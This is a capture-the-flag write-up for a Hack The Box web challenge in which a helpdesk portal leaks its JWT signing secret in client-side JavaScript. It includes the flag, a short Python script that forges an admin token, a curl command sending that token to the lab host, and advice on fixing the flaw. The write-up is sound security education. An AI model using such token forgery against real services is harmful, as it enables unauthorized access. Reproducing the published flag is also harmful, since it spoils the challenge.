# HTB - OpenSecret

**Category:** Web
**Difficulty:** Very Easy
**Target:** `154.57.164.77:30439`

## Challenge Scenario

> A simple help desk portal where users can submit support tickets. The application uses JWT tokens for session management, but something seems off about how they're implemented. Can you find the security flaw?

## Recon

The portal ("OpenSecret Helpdesk") issues a session as soon as the page loads. Looking at the client-side JavaScript in the page source (`view-source:` / `Ctrl+U`) is enough — there's no need to intercept traffic yet.

```html
<script>
    // JWT Secret Key
    const SECRET_KEY = "HTB{0p3n_s3cr3ts_ar3_n0t_s3cr3ts}";

    async function generateJWT() {
        const username = "guest_" + Math.floor(Math.random() * 10000);
        const header  = { alg: "HS256", typ: "JWT" };
        const payload = { username: username };
        ...
        const key = await crypto.subtle.importKey(
            "raw",
            new TextEncoder().encode(SECRET_KEY),
            { name: "HMAC", hash: "SHA-256" },
            false,
            ["sign"]
        );
        ...
    }
</script>
```

## The Vulnerability

**Hardcoded JWT signing secret, shipped to the client.**

The app signs session tokens with `HS256` (HMAC-SHA256) — a *symmetric* algorithm, meaning the exact same secret both signs and verifies the token. That secret is declared as a plain JavaScript constant, embedded directly in the HTML served to every visitor. Anyone who views the page source has the server's signing key.

This is a critical broken-authentication flaw for two reasons:

1. **The secret itself is the flag** — `HTB{0p3n_s3cr3ts_ar3_n0t_s3cr3ts}` is exposed in plaintext in the client-facing source, no exploitation required to retrieve it.
2. **Structurally, it breaks the entire session model** — since the payload only carries `{"username": "..."}` with no server-side authorization check beyond trusting the token's signature, anyone holding the secret can forge a token for *any* username (e.g. `admin`) and the server will accept it as legitimately issued.

## Proof of Concept — Forging a Token

```python
import jwt  # pip install pyjwt

secret = "HTB{0p3n_s3cr3ts_ar3_n0t_s3cr3ts}"
forged = jwt.encode({"username": "admin"}, secret, algorithm="HS256")
print(forged)
```

```bash
curl http://154.57.164.77:30439/ -H "Cookie: session_token=<forged_token>" -i
```

The server has no way to distinguish this from a token it issued itself, since the only proof of authenticity (the HMAC signature) can be reproduced by anyone with the leaked secret.

## Flag
HTB{0p3n_s3cr3ts_ar3_n0t_s3cr3ts}

## Root Cause & Fix

- Never embed an HMAC signing secret in client-delivered code — it must exist server-side only.
- Generate a long, cryptographically random secret and store it server-side (env var / secrets manager).
- Prefer asymmetric signing (`RS256`/`ES256`) for tokens if any part of the verification logic might ever need to be client-accessible — the private key never leaves the server.
- Don't derive authorization decisions purely from a client-influenceable claim (`username`) without also validating against server-side role/session state.
